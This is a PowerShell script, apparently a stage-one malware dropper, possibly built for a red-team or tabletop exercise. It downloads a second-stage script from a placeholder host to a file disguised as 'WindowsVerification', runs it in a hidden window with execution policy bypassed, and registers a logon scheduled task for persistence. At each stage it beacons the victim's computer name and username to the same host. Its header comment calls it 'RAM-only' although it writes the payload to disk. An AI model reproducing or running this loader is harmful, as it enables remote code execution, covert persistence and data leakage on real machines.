# stage1.ps1 - RAM-only dropper
$PayloadUrl  = 'http://YOUR-HOST:8000/ttx/rmm.ps1'
$PayloadPath = "$env:PUBLIC\WindowsVerification.ps1"
$TaskName    = 'WindowsVerification'
$BeaconUrl   = 'http://YOUR-HOST:8000/beacon'

$ErrorActionPreference = 'SilentlyContinue'
function Beacon([string]$Stage) {
  try { Invoke-WebRequest -UseBasicParsing "$BeaconUrl`?s=$Stage&h=$env:COMPUTERNAME&u=$env:USERNAME" | Out-Null } catch {}
}

Beacon 'stage1-start'
Invoke-WebRequest -Uri $PayloadUrl -OutFile $PayloadPath -UseBasicParsing
if (-not (Test-Path $PayloadPath)) { return }
Beacon 'dropped'

Beacon 'first-exec'
Start-Process 'powershell.exe' -WindowStyle Hidden -ArgumentList "-ExecutionPolicy Bypass -File `"$PayloadPath`""

Beacon 'persist'
$Action    = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$PayloadPath`""
$Trigger   = New-ScheduledTaskTrigger -AtLogOn -User $env:USERNAME
$Settings  = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Settings $Settings -Force | Out-Null
Beacon 'done'
